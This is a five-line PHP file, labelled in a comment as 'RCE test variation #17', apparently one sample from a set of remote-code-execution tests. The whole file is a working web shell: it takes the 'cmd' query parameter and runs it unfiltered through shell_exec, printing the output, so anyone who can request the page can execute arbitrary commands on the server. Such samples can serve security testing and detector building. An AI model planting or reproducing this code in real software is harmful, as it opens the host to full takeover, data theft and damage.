<?php
// RCE test variation #17
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>